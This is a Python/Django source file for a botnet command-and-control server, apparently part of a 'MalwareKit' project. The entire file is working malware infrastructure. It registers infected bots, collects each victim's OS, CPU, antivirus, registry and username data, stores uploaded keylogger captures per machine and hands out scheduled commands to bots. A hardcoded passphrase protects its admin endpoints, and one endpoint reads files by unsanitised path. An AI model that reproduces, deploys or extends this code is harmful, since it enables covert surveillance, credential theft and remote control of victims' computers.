from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse
import json
import re
import datetime
import time
#import StringIO

#imports and set environmental variables
import sqlite3
import os
os.environ.setdefault('DJANGO_SETTINGS_MODULE','admin_ui_project.settings')

#setup django
import django
django.setup()

#import botmaster database models
from database.models import System_Information, Antivirus, Connection, Keylogging, Location, Registry, User, Bot, Action, Bot_Action

#global database variabless
conn = None     #database connection
botinfo = None  #database iterator
THRESHOLD = 10  #max number of connections for the day, anything more is suspicious

########################################## START API
#These APIs are utilized by by the bots to store and retrieve information

@csrf_exempt
# bot_id, mac_address, ip_address[optional]
def connect_in(request):
    #NO MAC_ADDRESS OR NO BOT_ID
    if 'mac_address' not in request.GET or 'bot_id' not in request.GET:
        return HttpResponse(400)

    #MAC_ADDRESS, BOT_ID
    else:
        #CHECK IF VALID BOT_ID
        bot_id = request.GET['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')                   #KILL?

        #GET OTHER POST INFO
        mac_address = request.GET['mac_address']
        sys_information = getSystemInformation(mac_address)
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param
        if 'ip_address' in request.GET:
            if(isIpValid(request.GET['ip_address'])):
                ip_address = request.GET['ip_address']

        #OLD INFO
        if(sys_information!=None):
            #if mac_address is allowed to make connections
            if(sys_information[3]):
                #if connection count is over threshold
                if(getConnectionCount(mac_address) > THRESHOLD):
                    #change connection status to false
                    updateMacConnectionAllowed(mac_address, False)
                    return HttpResponse("MAC DENIED")
                #if connection count it less threshold
                else:
                    #add connection
                    insertConnection(bot_id,mac_address,ip_address,'/api/connect_in/')
                    #return some sort of action
                    #return HttpResponse("you are old, here is an action")
            #else, if connection status is false
            else:
                #mac_address is denied from connections
                return HttpResponse("MAC DENIED")
        #NEW INFO
        else:
            #VALID MAC_ADDRESS
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)                        #add new mac_address
                insertConnection(bot_id,mac_address,ip_address,'/api/connect_in/') #add connection
                #return HttpResponse("you are new, here is an action")
            #INVALID MAC_ADDRESS
            else:
                return HttpResponse(400)

        #SEND AN ACTION
        bot_id = request.GET['bot_id']
        actions = getOrderedBotAction(bot_id)
        print(actions)
        actionInfo = []
        #get all actions
        for action in actions:
            actionInfo.append([action, getActionById(action[1])[0]])
        #make bot, action pairs
        for action in actionInfo:
            #action type is enabled
            if(action[1][2]):
                #action is new
                if(action[0][2] == 0):
                    #incrememnt count
                    incrementBotAction(bot_id,action[1][1])
                    #if action can only be done once, disable it
                    if(action[1][3] == 'Once'):
                        disableBotAction(bot_id,action[1][1])
                    return HttpResponse(action[1][1])
                #action has been done before
                else:
                    #do not send action unless proven sendable
                    send_action = False
                    #not a time based action
                    if(action[1][3] == 'Anytime'):
                        #action will be sent
                        send_action = True
                    #time based action
                    else:
                        #get time action was last performed
                        year =int(action[0][4][0:4])
                        month = int(action[0][4][5:7])
                        day =int(action[0][4][8:10])
                        hour =int(action[0][4][11:13])
                        #determines if action should be sent
                        send_action = validateActionType(action[1][3], year, month, day, hour)

                    #if action should be sent
                    if(send_action):
                        #increment count, last_performed timestamp
                        incrementBotAction(bot_id, action[1][1])
                        #return action
                        return HttpResponse(action[1][1])
        #no actions are available to be done
        return HttpResponse('None')

def validateActionType(action_type, year, month, day, hour):
    now = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
    now_year =int(now[0:4])
    now_month = int(now[5:7])
    now_day =int(now[8:10])
    now_hour =int(now[11:13])
    send_action = False
    #hourly action
    if(action_type == 'Hourly'):
        if(now_hour - hour >= 1):
            send_action = True
    #daily action
    elif(action_type == 'Daily'):
        if(now_day - day >= 1):
            send_action = True
    #weekly action
    elif(action_type == 'Weekly'):
        if(now_day - day >= 7):
            send_action = True
    #biweekly action
    elif(action_type == 'Biweekly'):
        if(now_day - day >=14):
            send_action = True
    #monthly action
    elif(action_type == 'Monthly'):
        if(now_month - month >= 1):
            send_action = True
    #quarterly action
    elif(action_type == 'Quarterly'):
        if(now_month - month >= 3):
            send_action = True
    #bianually action
    elif(action_type == 'Bianually'):
        if(now_month - month >= 3):
            send_action = True
    #yearly action
    elif(action_type == 'Yearly'):
        if(now_year - year >= 1):
            send_action = True
    #invalid time based action type
    else:
        send_action = False

    return send_action

#DONE
@csrf_exempt
# mac_address, os, bot_id ip_address[optional]
def add_os(request):
    if(request.method == 'POST'):
        #parameters do not match
        #print(request.POST['m\x00a\x00c\x00_\x00a\x00d\x00d\x00r\x00e\x00s\x00s\x00'].replace('\x00',""))
        if 'mac_address' not in request.POST or 'os' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        op_sys = request.POST['os']
        ip_address = 'xxx.xxx.xxx.xxx'

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
             #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        updateOS(mac_address, op_sys)                           #update os
        insertConnection(bot_id, mac_address,ip_address,'/api/add_os/') #add connection
        return HttpResponse(200)
    else:
        return HttpResponse(400)

#DONE
@csrf_exempt
# mac_address, cpu, bot_id, ip_address[optional]
def add_cpu(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'cpu' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        cpu = request.POST['cpu']
        ip_address = 'xxx.xxx.xxx.xxx'

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
             #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        updateCPU(mac_address, cpu)                              #update cpu
        insertConnection(bot_id, mac_address,ip_address,'/api/add_cpu/') #add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, bot_id, antivirus, ip_address[optional]
def add_antivirus(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'antivirus' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        antivirus = request.POST['antivirus']
        ip_address = 'xxx.xxx.xxx.xxx'
        #check if an ip address was passed as a param

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
             #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertAntivirus(mac_address, antivirus)                       #add antivirus
        insertConnection(bot_id, mac_address,ip_address,'/api/add_antivirus/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, bot_id, registry, ip_address[optional]
def add_registry(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'registry' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        registry = request.POST['registry']
        ip_address = 'xxx.xxx.xxx.xxx'

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertRegistry(mac_address, registry)                        #add registry
        insertConnection(bot_id, mac_address,ip_address,'/api/add_registry/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address,bot_id, username, ip_address[optional]
def add_username(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'username' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        username = request.POST['username']
        ip_address = 'xxx.xxx.xxx.xxx'

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
             #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        insertUsername(mac_address, username)                       #add username
        insertConnection(bot_id, mac_address,ip_address,'/api/add_username/')#add connection
        return HttpResponse(200)

#DONE
@csrf_exempt
# mac_address, bot_id, file(attatched to post), ip_address[optional]
def add_keylogging(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'mac_address' not in request.POST or 'file' not in request.FILES or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        ip_address = 'xxx.xxx.xxx.xxx'

        #CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
             #increment bot connection count
            botConnectIn(bot_id)
            #bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        #check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        #add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            #mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(300)
        #make sure that mac_address exists before entering file
        if(getSystemInformation(mac_address)!=None):
            handle_uploaded_file(mac_address, request.FILES['file'])
            insertConnection(bot_id, mac_address,ip_address,'/api/add_keylogging/')
        return HttpResponse(200)
#DONE ^^
def handle_uploaded_file(mac_address, f):
    #count files in directory
    #filename = len([f for f in os.walk("./keylogging/").next()[2] if f[-4:] == ".txt"]) + 1
    file_count = 1
    #filename = len([name for name in os.listdir("C://Users/Administrator/admin_ui_project/database/keylogging") if os.path.isfile(name)]) + 1
    #check if file is an acceptable name, increment name if not valid
    while(insertKeylogging(mac_address, mac_address+"---"+str(file_count)) == 0):
        file_count = file_count + 1
    #check if directory exists, create if not
    try:
        os.stat("./database/keylogging/"+mac_address)
    except:
        os.mkdir("./database/keylogging/"+mac_address)
    #open file within the keylogging folder
    filename = "./database/keylogging/"+mac_address+"/"+mac_address + '---' +str(file_count)+".txt"
    destination = open(filename, 'w')
    for chunk in f.chunks():
        #write file
        destination.write(chunk)
    #close file
    destination.close()

#WORRY ABOUT AUTHENTICATION FOR THIS GET REQUEST. WE DONT WANT PEOPLE TO USE IT.
@csrf_exempt
def get_keylogging(request):
    if 'filename' not in request.GET or 'mac_address' not in request.GET or 'passphrase' not in request.GET:
        return HttpResponse(400)
    else:
        if(request.GET['passphrase'] != 'A79BH4G9'):
            return HttpResponse(400)
        with open('./database/keylogging/'+request.GET['mac_address']+'/'+request.GET['filename']+'.txt', 'r') as f:
            return HttpResponse(f.read())

#DONE
@csrf_exempt
# passphrase, action
def add_action(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'passphrase' not in request.POST or 'action' not in request.POST:
            return HttpResponse(400)
        passphrase = request.POST['passphrase']
        #passphrase is not valid
        if(passphrase != 'A79BH4G9'):
            return HttpResponse(400)
        action = request.POST['action']
        #if action does not exist, add it
        if(len(getAction(action))==0):
            insertAction(action)
        return HttpResponse(200)
    else:
        return HttpResponse(400)

#DONE
@csrf_exempt
# passphrase, bot
def add_bot(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'passphrase' not in request.POST or 'bot' not in request.POST:
            return HttpResponse(400)
        passphrase = request.POST['passphrase']
        #passphrase is not valid
        if(passphrase != 'A79BH4G9'):
            return HttpResponse(400)
        bot = request.POST['bot']
        #if bot does not exist, add it
        if(len(getBot(bot))==0 and len(bot)==16):
            insertBot(bot)
        return HttpResponse(200)
    else:
        return HttpResponse(400)

#DONE
@csrf_exempt
# passphrase, action
def add_bot_action(request):
    if(request.method == 'POST'):
        #parameters do not match
        if 'passphrase' not in request.POST or 'action' not in request.POST or 'bot' not in request.POST:
            return HttpResponse(400)
        passphrase = request.POST['passphrase']
        #passphrase is not valid
        if(passphrase != 'A79BH4G9'):
            return HttpResponse(400)
        action = request.POST['action']
        bot = request.POST['bot']
        #if action param does not exit, add it
        if(getBotAction(bot, action)==None):
            insertBotAction(bot, action)
        return HttpResponse(200)
    else:
        return HttpResponse(400)
########################################## END API

########################################## START DATABASE
#connect the database
def connect():
    global botinfo,conn
    conn = sqlite3.connect('C:\\Users\Administrator\Botmaster\\MalwareKit_Master\\admin_ui_project\db.sqlite3')
    #actions = sqlite3.connect(actions.sqlite3)
    botinfo = conn.cursor()
    return 1

#disconnect the database
def disconnect():
    global conn
    conn.close()
########################################## END DATABASE

########################################## GET INFORMATION
#Database get query functions which are utilized by the APIs

# mac address, os, cpu , connection allowed
def getSystemInformation(mac_address):
    #get system information for a specified mac address
    connect()
    botinfo.execute("SELECT mac_address,op_system,cpu,connection_allowed FROM database_system_information WHERE mac_address=?",(mac_address,))
    data = botinfo.fetchone()
    disconnect()
    return data

# mac address, username
def getUsernames(mac_address):
    #get all associated username to a specified mac address
    connect()
    botinfo.execute("SELECT mac_address_id,username FROM database_user WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, antivirus
def getAntiviruses(mac_address):
    #get all associated antivirus programs detected for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,antivirus_detected FROM database_antivirus WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, registry
def getRegistries(mac_address):
    #get all associated registries detected for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,registry FROM database_registry WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, ip address, timestamp of total connections
def getConnections(mac_address):
    #get all connections made for a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# mac address, ip address, timestamp of daily connections
def getDailyConnections(mac_address):
    #get only today's connections made by a mac address
    connect()
    today = datetime.date.today()
    format = '%Y-%m-%d'
    epoch = int(time.mktime(time.strptime(str(today),format)))
    tomorrow = epoch + 86400
    tomorrow = time.strftime('%Y-%m-%d', time.localtime(tomorrow))
    botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=? AND timestamp BETWEEN ? AND ?",(mac_address,today,tomorrow,))
    data = botinfo.fetchall()
    disconnect()
    return data

# returns the number of connections made today for
def getConnectionCount(mac_address):
    connectionArray = getDailyConnections(mac_address)
    return len(connectionArray)

#could need to be changed
# mac address, ip address, location
def getLocationFromMac(mac_address):
    #get all locations associated with a mac_address
    result = []
    #get ips associated with a mac address
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE mac_address_id=?",(mac_address,))
    for entry in query.fetchall():
        #get locations associated with all ip addresses
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            #build array of all locations associated with mac address
            result.insert(len(result),(mac_address,entry[1],entry2[0]))
    return result

# ip address, location
def getLocationFromIp(ip_address):
    #get all locations associated with an ip address
    result = []
    #get entries from connection table associated with ip
    query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE ip_address=?",(ip_address,))
    for entry in query.fetchall():
        #get locations associated with ip address
        query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
        for entry2 in query2.fetchall():
            #build array of all locations associated with ip address
            result.insert(len(result),(entry[1],entry2[0]))
    return result

# mac address, keylog file name
def getKeyloggings(mac_address):
    #get all keylogging entries associated with a mac address
    connect()
    botinfo.execute("SELECT mac_address_id,filename,timestamp FROM database_keylogging WHERE mac_address_id=?",(mac_address,))
    data = botinfo.fetchall()
    disconnect()
    return data

# action existence
def getAction(action):
    #get an action if it exists
    connect()
    botinfo.execute("SELECT id,action,enabled, frequency FROM database_action WHERE action=?",(action,))
    data = botinfo.fetchall()
    disconnect()
    return data

def getActionById(action_id):
    #get an action by id if it exists
    connect()
    botinfo.execute("SELECT id,action,enabled, frequency FROM database_action WHERE id=?",(action_id,))
    data = botinfo.fetchall()
    disconnect()
    return data

# bot existence
def getBot(bot_id):
    #get a bot if it exists
    connect()
    botinfo.execute("SELECT id,bot_id,created,connection_count,connection_allowed FROM database_bot WHERE bot_id=?",(bot_id,))
    data = botinfo.fetchall()
    disconnect()
    return data

#get bot action existence
def getBotAction(bot_id, action_name=None):
    #get a bot if it exists
    bot = getBot(bot_id)
    if(bot == []):
        return -1
    bot = bot[0]
    action = getAction(action_name)
    if(action == [] and action_name!=None):
        return -1
    connect()
    botinfo.execute("SELECT bot_id_id,action_id,action_count,enabled,last_performed FROM database_bot_action WHERE bot_id_id=?",(bot[0],))
    data = botinfo.fetchall()
    if(action_name==None):
        return data
    else:
        for entry in data:
            if(entry[1] == action[0][0]):
                disconnect()
                return entry

#get bot action existence
def getOrderedBotAction(bot_id, action_name=None):
    #get a bot if it exists
    bot = getBot(bot_id)
    if(bot == []):
        return -1
    bot = bot[0]
    action = getAction(action_name)
    if(action == [] and action_name!=None):
        return -1
    connect()
    botinfo.execute("SELECT bot_id_id,action_id,action_count,enabled,last_performed FROM database_bot_action WHERE bot_id_id=? ORDER BY last_performed ASC",(bot[0],))
    data = botinfo.fetchall()
    if(action_name==None):
        return data
    else:
        for entry in data:
            if(entry[1] == action[0][0]):
                disconnect()
                return entry
################################### END GET INFORMATION

################################### INSERT INFORMATION
#Database insert query functions which are utilized by the APIs

def insertSystemInformation(mac_address, op_system='None', cpu='None',  connection_allowed=True):
    #convert boolean to integer
    if(connection_allowed==True):
        connection_allowed=1
    else:
        connection_allowed=0
    #mac address does not exist
    if(getSystemInformation(mac_address)==None):
        #add system information
        obj = System_Information(mac_address=mac_address,op_system=op_system,cpu=cpu,connection_allowed=connection_allowed)
        obj.save()

def insertAntivirus(mac_address,antivirus_detected):
    #invalid antirivus
    if(antivirus_detected == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        #add antivirus
        for x in getAntiviruses(mac_address):
            #registry already exists
            if x[1] == antivirus_detected:
                return -1
        #registry does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Antivirus(mac_address=sys_info,antivirus_detected=antivirus_detected)
        obj.save()

def insertConnection(bot_id, mac_address, ip_address='xxx.xxx.xxx.xxx', connection_type='NA'):
    #invalid ip_address
    if(ip_address == None or len(mac_address)!=17):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        #add connection
        sys_info = System_Information.objects.get(mac_address=mac_address)
        bot = Bot.objects.get(bot_id=bot_id)
        obj = Connection(bot_id= bot , mac_address=sys_info,ip_address=ip_address,connection_type=connection_type)
        obj.save()

#NEEDS WORK
def insertLocation(ip_address,location):
    #invalid location
    if(location == None):
        return -1
    #ip_address exists in connection table
    ip_addr = Connection.objects.filter(ip_address=ip_address)[0]
    if(ip_addr!=None):
        #add location
        obj = Location(ip_address=ip_addr,country=location)
        obj.save()

def insertRegistry(mac_address,registry):
    #registry is invalid
    if(registry == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getRegistries(mac_address):
            #registry already exists
            if x[1] == registry:
                return -1
        #registry does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Registry(mac_address=sys_info,registry=registry)
        obj.save()

def insertKeylogging(mac_address, filename):
    #filename is invalid
    if(filename == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getKeyloggings(mac_address):
            #filename already exists
            if x[1] == str(filename):
                return 0
        #filename does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = Keylogging(mac_address=sys_info,filename=filename)
        obj.save()
        return 1

def insertUsername(mac_address, username):
    #username is invalid
    if(username == None):
        return -1
    #mac address exists
    if(getSystemInformation(mac_address)!=None):
        for x in getUsernames(mac_address):
            #username already exists
            if x[1] == username:
                return -1
        #username does not exist, add it
        sys_info = System_Information.objects.get(mac_address=mac_address)
        obj = User(mac_address=sys_info,username=username)
        obj.save()

def insertAction(action):
    #action is invalid
    if(action == None):
        return -1
    #action does not exist
    if(len(getAction(action))==0):
        action = Action(action = action, enabled=True)
        action.save()

def botConnectIn(bot_id):
    #bot_id is invalid
    if(bot_id == None):
        return -1
    #increment bot connection count
    if(getBot(bot_id)!=[]):
        bot = Bot.objects.get(bot_id=bot_id)
        bot.connection_count = bot.connection_count + 1
        bot.save()

def insertBot(bot_id):
    #bot is valid
    if(bot_id == None):
        return -1
    #action does not exist
    if(len(getBot(bot_id))==0):
        bot = Bot(bot_id = bot_id)
        bot.save()

def insertBotAction(bot_id, action):
    #bot is valid
    if(bot_id == None or action == None):
        return -1
    #action does not exist
    print(getBotAction(bot_id, action))
    if(getBotAction(bot_id, action)==None and len(getAction(action))!=0 and len(getBot(bot_id))!=0):
        bot_obj = Bot.objects.get(bot_id = bot_id)
        action_obj = Action.objects.get(action = action)
        bot_action_obj = Bot_Action(bot_id = bot_obj, action=action_obj,action_count=0, enabled=True)
        bot_action_obj.save()
################################### END INSERT INFORMATION

################################### START UPDATE INFORMATION
#Database update query functions which are utilized by the APIs

def updateOS(mac_address, op_sys):
    #update os for mac address
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.op_system == 'None'):
            sys_info.op_system = op_sys
            sys_info.save()

def updateCPU(mac_address, cpu):
    #update cpu for mac address
    if(getSystemInformation(mac_address)!=None):
        sys_info = System_Information.objects.get(mac_address=mac_address)
        if(sys_info.cpu == 'None'):
            sys_info.cpu = cpu
            sys_info.save()

def updateMacConnectionAllowed(mac_address,connection_allowed):
    #update connection allowed for mac address
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = connection_allowed
    sys_info.save()

def toggleMacConnectionAllowed(mac_address):
    #toggle connection true/false
    sys_info = System_Information.objects.get(mac_address=mac_address)
    sys_info.connection_allowed = not(sys_info.connection_allowed)
    sys_info.save()

def updateBotConnectionAllowed(bot_id,connection_allowed):
    #update connection allowed for bot
    bot_info = Bot.objects.get(bot_id=bot_id)
    bot_info.connection_allowed = connection_allowed
    bot_info.save()

def toggleBotConnectionAllowed(bot_id):
    #toggle connection true/false
    bot_info = Bot.objects.get(bot_id=bot_id)
    bot_info.connection_allowed = not(bot_info.connection_allowed)
    bot_info.save()


################################## END UPDATE INFORMATION

################################## START OTHER
#Other functions are placed here

#Checks if a mac_address meets a certain format
def isMacValid(mac_address):
    if(len(mac_address)!=17):
        return False
    if(mac_address[2]=='-' and mac_address[5]=='-' and mac_address[8]=='-' and mac_address[11]=='-' and mac_address[14]=='-'):
        return True
    else:
        return false

#Checks if an ip_address meets a certain format
def isIpValid(ip_address):
    reg = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if(reg.match(ip_address)):
        return True
    else:
        return False
################################## END OTHER


def incrementBotAction(bot_id, action_id):
    bot_obj = Bot.objects.get(bot_id = bot_id)
    action_obj = Action.objects.get(action = action_id)
    botAction = Bot_Action.objects.get(bot_id = bot_obj, action=action_obj)
    botAction.action_count = botAction.action_count + 1
    botAction.save()
    return 0

def disableBotAction(bot_id, action_id):
    bot_obj = Bot.objects.get(bot_id = bot_id)
    action_obj = Action.objects.get(action = action_id)
    botAction = Bot_Action.objects.get(bot_id = bot_obj, action=action_obj)
    botAction.enabled = not (botAction.enabled)
    botAction.save()
    return 0